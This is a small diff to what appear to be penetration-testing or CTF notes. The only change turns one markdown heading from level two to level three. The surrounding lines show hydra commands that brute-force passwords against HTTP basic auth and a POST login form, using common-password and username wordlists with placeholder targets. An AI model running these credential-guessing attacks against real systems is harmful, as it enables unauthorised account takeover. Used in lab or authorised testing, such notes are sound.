@@ -53,7 +53,7 @@ for password in passwords:
 hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt IP http-get / -s PORT
 ```
 
-## Auth with a POST form 
+### Auth with a POST form 
 ```zsh
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 ```
